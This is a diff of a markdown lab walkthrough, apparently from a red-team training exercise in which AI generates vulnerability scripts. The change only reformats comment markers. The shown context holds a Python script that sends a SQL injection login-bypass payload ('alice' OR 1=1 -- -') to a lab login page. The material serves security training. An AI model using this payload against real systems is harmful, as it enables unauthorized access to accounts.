@@ -34,29 +34,29 @@ accountability—is non-negotiable for responsible deployment.
 - open Firefox and search `10.49.131.45`
 ### Stage 1: Introduction Guidance and Instructions
 - Press Complete Stage and Continue
-- 
+
 ### Stage 2: Red Team Generate Python Scripts for Vulnerabilities 
 
 Generated Python script for vulnerabilities using AI:
 
 import requests
-# Set up the login credentials
+#### Set up the login credentials
 username = "alice' OR 1=1 -- -"
 password = "test"
 
-# URL to the vulnerable login page
+#### URL to the vulnerable login page
 url = "http://MACHINE_IP:5000/login.php"
 
-# Set up the payload (the input)
+#### Set up the payload (the input)
 payload = {
     "username": username,
     "password": password
 }
 
-# Send a POST request to the login page with our payload
+#### Send a POST request to the login page with our payload
 response = requests.post(url, data=payload)
 
-# Print the response content
+#### Print the response content
 print("Response Status Code:", response.status_code)
 print("\nResponse Headers:")
 for header, value in response.headers.items():
